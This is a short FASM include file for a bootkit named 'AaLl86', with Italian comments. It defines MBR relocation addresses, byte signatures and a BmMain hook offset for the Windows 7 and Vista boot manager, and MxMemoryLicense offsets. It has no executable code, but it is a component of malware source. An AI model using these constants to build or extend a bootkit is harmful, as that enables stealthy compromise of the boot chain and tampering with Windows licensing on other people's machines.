; AaLl86 Bootkit Include File (for FASM)

LOADLOC equ 7C00h		; L'indirizzo originale di caricamento dell'MBR
SECTORSIZE equ 0512d		; Dimensione di un settore del disco (512 bytes)
ORIGINAL_MBR_SECTOR = 01h	; Il settore in cui c'è il MBR originale (ricorda che in CHS il primo settore è 1)
CODEBASEIN1MB = 9f00h		; Il Segmento in cui copio l'intero MBR modificato
CODEBASEIN1MBEXACT = 9f000h	; Indirizzo virtuale Protected Mode in cui è mappato il segmento CODEBASEIN1MB
NTOSKRNL_SIZE = 3C6370h 				; Ntoskrnl size (the usage of this SYMBOL is actually wrong)

; Original offset and signatures:
; Windows 7 Signature
;bootmgr_firstbyte = 00h
;bootmgr_signature = 03B51447Eh         ; last four bytes of bootmgr
BmMainOffset = 0a8ch			  ; offset jump to bootmgr BmMain

;Windows Vista Signature
bootmgr_firstbyte = 0F6h
bootmgr_signature = 04ade979bh		; last four bytes of bootmgr


; Vista SP2 MxMemoryLicense: 0x035444C
; Windows Seven SP1 MxMemoryLicense: 0x03A6BA2
MEMORY_LICENSE_START = 0340000h